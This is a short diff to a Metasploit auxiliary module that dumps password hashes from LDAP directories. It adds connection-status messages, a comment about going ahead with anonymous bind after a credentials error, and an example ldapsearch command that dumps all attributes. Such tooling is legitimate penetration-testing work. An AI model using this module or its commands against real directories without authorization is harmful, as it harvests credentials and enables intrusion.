@@ -67,12 +67,19 @@ class MetasploitModule < Msf::Auxiliary
   #   ldapsearch -xb "" -s base -H ldap://[redacted]
   #
   # Dump data using discovered base DN:
-  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] \* + -
+  #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
   def run
     entries = nil
     base_dn_vuln = nil
 
     ldap_connect do |ldap|
+      if ldap.get_operation_result.code == 0
+        print_status("#{peer} LDAP connection established")
+      else
+        # Even if we get "Invalid credentials" error, we may proceed with anonymous bind
+        print_error("#{peer} LDAP error #{ldap.get_operation_result.code}: #{ldap.get_operation_result.message}")
+      end
+
       if (base_dn = datastore['BASE_DN'])
         print_status("User-specified base DN: #{base_dn}")
         naming_contexts = [base_dn]
@@ -137,7 +144,7 @@ class MetasploitModule < Msf::Auxiliary
     @pass_attr ||= datastore['PASS_ATTR']
 
     print_status("Searching for attribute(s): #{@pass_attr}")
-    # Process entries with a non-empty userPassword attribute
+    # Process entries with a non-empty hash/password attribute
     @pass_attr.split(/[,\s]+/).compact.reject(&:empty?).each do |item|
       process_hashes(entries.select { |entry| entry[item.strip].any? }, item.strip)
     end
